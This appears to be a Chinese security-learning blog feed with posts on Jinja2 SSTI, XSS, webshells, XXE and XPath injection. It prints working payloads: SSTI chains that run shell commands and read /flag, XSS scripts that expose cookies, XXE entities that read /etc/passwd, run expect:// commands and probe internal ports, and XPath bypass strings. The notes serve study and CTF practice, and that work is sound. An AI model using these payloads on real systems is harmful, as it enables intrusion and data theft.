<h2 id="3-手注"><a href="#3-手注" class="headerlink" title="3.手注"></a>3.手注</h2><img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011163437-uwwm9wn.png" class="" title="image">​

<p>‍</p>
<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011163426-2l2qr4l.png" class="" title="image">​

<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011163521-3ciktrf.png" class="" title="image">​

<p>输入4输出结果为22，为python模板，那么模板注入为jinja2</p>
<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011164720-78f747t.png" class="" title="image">​

<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011192035-d7cjj8v.png" class="" title="image">

<p>相对于config比，这个for循环可以格式化输出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> key,value <span class="keyword">in</span> config.items() %&#125;</span><br><span class="line">	&lt;dt&gt;&#123;&#123; key|e &#125;&#125;&lt;/dt&gt;</span><br><span class="line">	&lt;dd&gt;&#123;&#123; value|e&#125;&#125;&lt;/dd&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011193009-jxnjzxr.png" class="" title="image">​

<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011193148-xw8kgn6.png" class="" title="image">​

<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011193437-rrdrcqb.png" class="" title="image">​

<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011193530-tw83tiy.png" class="" title="image">​

<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011193550-idzqd15.png" class="" title="image">​

<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011193703-xvzbvjq.png" class="" title="image">​

<p>1.用数组进行遍历</p>
<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011193810-818s6xc.png" class="" title="image">

<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011193946-i86zsq7.png" class="" title="image">​

<p>2.for循环</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;%<span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__()%&#125;&#123;%<span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span>%<span class="string">&#x27;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>3.bp爆破</p>
<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011194422-hkayqc8.png" class="" title="image">​

<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011194609-49fey7l.png" class="" title="image">​

<h2 id="4-Payload大全"><a href="#4-Payload大全" class="headerlink" title="4.Payload大全"></a>4.Payload大全</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">169</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&quot;cat /flag&quot;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># os._wrap_close类中的popen</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># os._wrap_close类中的system</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># __import__方法</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># __builtins__</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Jinja2创建的url_for()方法</span></span><br><span class="line">&#123;&#123;url_for.__globals__.os.popen(<span class="string">&quot;cat /flag&quot;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">因为后端没有任何过滤，所以我们可以通过python的内置函数获取<span class="built_in">eval</span>执行任意命令，这个Payload在网上也可以轻易找到</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">	直接粘过去就可以了，要获取flag，就把<span class="built_in">id</span>改成cat /flag即可。Payload放完了，解释下这个Payload的意思</span><br></pre></td></tr></table></figure>

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/2023/10/23/XSS/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><img src="/2023/10/23/XSS/image-20231007151332-we1gtzh.png" class="" title="image">

<img src="/2023/10/23/XSS/image-20231007151357-rmshw6g.png" class="" title="image">​​

<h2 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h2><img src="/2023/10/23/XSS/image-20231007151452-6u1hcay.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007153256-ip4iaah.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007153341-gzzru57.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007153700-jbjonhu.png" class="" title="image">​

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;点击此处修复&quot;</span>);location.<span class="property">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/XSS/image-20231007154117-kqcgalk.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007154126-ciqlrmv.png" class="" title="image">​

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/XSS/image-20231007155044-y8670bs.png" class="" title="image">​

<p>例二：</p>
<img src="/2023/10/23/XSS/image-20231007160101-qgjhn4w.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007160114-auvzu8f.png" class="" title="image">​

<p>并没有被当作脚本执行。</p>
<p>发现我们输入的脚本在p标签中。我们可以闭合p标签。</p>
<img src="/2023/10/23/XSS/image-20231007160214-3v6ia0f.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007160338-l5igdxi.png" class="" title="image">​

<p>成功执行。</p>
<img src="/2023/10/23/XSS/image-20231007160350-xd2zzbh.png" class="" title="image">​

<h2 id="2-存储型xss"><a href="#2-存储型xss" class="headerlink" title="2.存储型xss"></a>2.存储型xss</h2><img src="/2023/10/23/XSS/image-20231007160605-apt9vh2.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007160712-56nl6y0.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007160723-vzo6snz.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007161035-33avgs2.png" class="" title="image">​

<p>每次刷新网站都会弹出。</p>
<img src="/2023/10/23/XSS/image-20231007161132-gwoznx1.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007162053-naa0g4b.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007162347-5bk8cvr.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007162405-tkygbp3.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007162400-en8edd4.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007163904-flq6rm1.png" class="" title="image">​

<p>beef-xss为kali自带。</p>
<img src="/2023/10/23/XSS/image-20231007163939-s8vz2jt.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007194517-1yxt4cs.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007194632-ilw56rm.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007194709-2dw3pth.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007194722-5yiaog5.png" class="" title="image">​

<h2 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="3.DOM型XSS"></a>3.DOM型XSS</h2><img src="/2023/10/23/XSS/image-20231007194919-gdxszj0.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007195004-cckvbmz.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007195204-maa9grg.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007202615-0g13wv4.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007202742-fuekpsk.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007202943-ik6s9uc.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007203006-6tcqtt7.png" class="" title="image">​

<h2 id="4-mXSS"><a href="#4-mXSS" class="headerlink" title="4.mXSS"></a>4.mXSS</h2><img src="/2023/10/23/XSS/image-20231007203110-v82q8m6.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007203148-fsmx7kf.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007203219-wl047xr.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007203411-uimo94h.png" class="" title="image">​

<img src="/2023/10/23/XSS/image-20231007203420-ip9opv0.png" class="" title="image">​

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>WEBshell</title>
    <url>/2023/10/23/WEBshell/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="WEBshell"><a href="#WEBshell" class="headerlink" title="WEBshell"></a>WEBshell</h1><img src="/2023/10/23/WEBshell/image-20231006210234-35gseeg.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006210309-dgmx3y6.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006210713-r08hue4.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006210748-9nqzpid.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006210858-y39rnvg.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006211657-j434d2k.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006212145-fu2h3dq.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006212212-z5zp4sf.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006223050-5vk14iz.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006223144-g9xwihg.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006223227-tjlofms.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006223341-qg8emwn.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006223459-t96wtt1.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006223520-hnhmuzd.png" class="" title="image">​

<h2 id="奇技淫巧-隐藏和免杀"><a href="#奇技淫巧-隐藏和免杀" class="headerlink" title="奇技淫巧-隐藏和免杀"></a>奇技淫巧-隐藏和免杀</h2><img src="/2023/10/23/WEBshell/image-20231006224019-fx9a945.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006224135-ebe4wew.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006224157-4hqsveg.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006224240-l0ap0bb.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006224337-wk6qsi0.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006224526-rvlltga.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006224650-95uxg0b.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006225758-ul79ye7.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006225822-hcq34wl.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006225911-1c1zfov.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006225944-vxmd543.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006230104-nsqo9po.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006230147-w3ayqml.png" class="" title="image">​

<img src="/2023/10/23/WEBshell/image-20231006230234-b0folqq.png" class="" title="image">​

<p>‍</p>
<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>XXE</title>
    <url>/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h1 id="XXE的特征"><a href="#XXE的特征" class="headerlink" title="XXE的特征"></a>XXE的特征</h1><ul>
<li>特征1 — .ashx<br>看到url是 .ashx后缀的<br>​<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/1552062-20200409175017500-1061930549.png" class="">​</li>
<li>特征2 — 响应体是xml<br>​<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/1552062-20200409175116790-1090427191.png" class="">​</li>
</ul>
<p>发现有这些特征都可以用下面的流程测试</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>发包需要修改格式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Content-Type: application/xml</span><br></pre></td></tr></table></figure>

<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011083940-qedriw9.png" class="" title="image">​

<h2 id="2-XML基础知识"><a href="#2-XML基础知识" class="headerlink" title="2.XML基础知识"></a>2.XML基础知识</h2><img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011084344-vuyqzun.png" class="" title="image">​

<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011084556-gtqj455.png" class="" title="image">​

<h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA 的意思是被解析的字符数据（parsed character data）。</p>
<p>可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</p>
<p>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>
<p>文本中的标签会被当作标记来处理，而实体会被展开。</p>
<p>不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p>
<h2 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h2><p>CDATA 的意思是字符数据（character data）。</p>
<p><strong>CDATA 是不会被解析器解析的文本。</strong>在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p>
<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011085131-x9uqx0w.png" class="" title="image">​

<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011085448-wbkd9cy.png" class="" title="image">​

<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011085559-bcwcjzz.png" class="" title="image">​

<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011090038-ovzhiau.png" class="" title="image">​

<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011090436-pwka1q9.png" class="" title="image">​

<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011090601-o4vipqd.png" class="" title="image">​

<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011090617-274ovai.png" class="" title="image">



<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011090739-vcamysq.png" class="" title="image">​

<p>解析后：</p>
<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011090818-pbitfs0.png" class="" title="image">​

<h2 id="3-XXE漏洞利用"><a href="#3-XXE漏洞利用" class="headerlink" title="3.XXE漏洞利用"></a>3.XXE漏洞利用</h2><blockquote>
<p>有回显XXE和无回显XXE。</p>
</blockquote>
<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011091027-v0dhhqs.png" class="" title="image">

<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>成功测试到XXE漏洞</p>
<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011094218-irkn2ya.png" class="" title="image">​

<h3 id="1-任意文件读取"><a href="#1-任意文件读取" class="headerlink" title="1).任意文件读取"></a>1).任意文件读取</h3><p>原理就是构造一个可以访问系统默认文件hosts的Pyload，然后看看响应，看他说缺啥补充啥。如果是回显型XXE就会将配置文件的信息打印出来。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file:///c:/windows/system32/drivers/etc/hosts</span><br><span class="line">file:///etc/hosts</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># pyload</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">sp</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/system32/drivers/etc/hosts&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;sp;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011094510-gycy7uu.png" class="" title="image">​

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-系统命令执行"><a href="#3-系统命令执行" class="headerlink" title="3).系统命令执行"></a>3).系统命令执行</h3><p>1.在安装expect扩展的PHP环境里执行系统命令</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://ipconfig&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011095129-yznkh5c.png" class="" title="image">​

<h3 id="4-探测内网端口"><a href="#4-探测内网端口" class="headerlink" title="4).探测内网端口"></a>4).探测内网端口</h3><img src="/2023/10/23/XXE%E6%BC%8F%E6%B4%9E/image-20231011101052-ufyhlqe.png" class="" title="image">​

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://123.60.135.228:20&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-无回显XXE漏洞利用"><a href="#4-无回显XXE漏洞利用" class="headerlink" title="4).无回显XXE漏洞利用"></a>4).无回显XXE漏洞利用</h3><p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>Xpath注入</title>
    <url>/2023/10/23/Xpath%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="Xpath注入"><a href="#Xpath注入" class="headerlink" title="Xpath注入"></a>Xpath注入</h1><p>XPath（XML Path Language）是一种用于在XML文档中定位和提取数据的查询语言。XPath注入是一种安全漏洞，它发生在应用程序未正确验证或过滤用户提供的XPath查询时。攻击者可以通过构造恶意的XPath查询来执行未授权的操作或者访问敏感信息。</p>
<p>以下是XPath注入的一些常见示例和防护措施：</p>
<p><strong>示例 1：基本的XPath注入</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>正常的XPath查询：</p>
<figure class="highlight xpath"><table><tr><td class="code"><pre><span class="line">/user/username[<span class="type">text</span>()=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> /user/password/<span class="type">text</span>()=<span class="string">&#x27;admin123&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>恶意的XPath查询：</p>
<figure class="highlight xpath"><table><tr><td class="code"><pre><span class="line">/user/username[<span class="type">text</span>()=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>]/password/<span class="type">text</span>()=<span class="string">&#x27;admin123&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>在这个示例中，攻击者通过构造XPath查询来绕过认证，因为<code>1=1</code>​始终为真，所以他们可以成功登录。</p>
<p><strong>示例 2：导致数据库泄漏的XPath注入</strong></p>
<p>如果应用程序使用XPath来查询数据库，攻击者可能会尝试通过XPath注入来泄漏数据库信息。</p>
<p>防护措施：</p>
<ol>
<li>使用参数化查询：不要直接将用户输入插入XPath查询中，而是使用参数化查询或预处理语句来构建XPath查询。这可以防止注入攻击。</li>
<li>输入验证和过滤：对于用户输入的数据，进行严格的输入验证和过滤，只允许有效的输入，并拒绝任何异常或非法的字符。</li>
<li>最小特权原则：确保应用程序在执行XPath查询时以最小特权权限运行，以减少攻击者能够访问的数据。</li>
<li>错误处理：不要将详细的错误信息暴露给用户，因为攻击者可以使用这些信息来进一步探测漏洞。</li>
</ol>
<p>XPath注入是一种严重的安全问题，可以导致数据泄漏、认证绕过和其他严重后果。因此，应该始终谨慎处理用户提供的XPath查询和数据。</p>
<img src="/2023/10/23/Xpath%E6%B3%A8%E5%85%A5/image-20231010112453-5aheh0g.png" class="" title="image">​

<p>‍</p>
<p>‍</p>
<p>XPath表达式 <code>&#39;]|//*|//*[&#39;</code>​ 是一种非常简单但也非常通用的XPath注入示例，它的目标是选择XML文档中的所有节点。让我为您详细解释它的查询过程：</p>
<ol>
<li><code>&#39;]</code>: 这个部分的开始是一个单引号，它用来尝试终止任何已存在的XPath查询。如果之前的XPath查询以单引号开始，这个部分会将其终止。</li>
<li><code>|</code>: 竖线 <code>|</code>​ 是XPath中的操作符，它表示执行多个XPath表达式。在这里，它用于连接不同的XPath查询片段。</li>
<li><code>//*</code>: <code>//*</code>​ 是一个XPath表达式片段，它选择了文档中的所有元素节点，无论它们在文档的什么位置。</li>
<li><code>|</code>: 再次是XPath中的操作符 <code>|</code>​。</li>
<li><code>//*</code>: 再次选择了文档中的所有元素节点。</li>
<li><code>[&#39;</code>: 最后是一个左方括号，它用于开始一个条件。在XPath中，方括号用于添加条件来筛选节点。</li>
</ol>
<p>综合起来，这个XPath表达式的意思是：</p>
<ul>
<li><p>首先，它试图终止任何已存在的XPath查询，因为它以单引号 <code>&#39;]</code>​ 开始。</p>
</li>
<li><p>然后，它使用 <code>|</code>​ 操作符连接两个条件：</p>
<ul>
<li>第一个条件是 <code>//*</code>​，它选择了文档中的所有元素节点。</li>
<li>第二个条件是再次的 <code>//*</code>​，也选择了文档中的所有元素节点。</li>
</ul>
</li>
<li><p>最后，表达式以左方括号 <code>[&#39;</code>​ 结束，但由于没有指定条件，所以条件为空。</p>
</li>
</ul>
<p>因此，这个XPath表达式的结果将是文档中的所有元素节点，因为它选择了所有元素节点并将它们连接在一起。</p>
<p>这种类型的XPath注入表达式通常用于绕过访问控制，尤其是当应用程序没有适当验证用户提供的输入并将其用作XPath查询的一部分时。攻击者可以构造类似的表达式来获取敏感数据或执行未经授权的操作。因此，对于用户输入的XPath查询，必须谨慎处理，以防止XPath注入攻击。</p>
<p>‍</p>
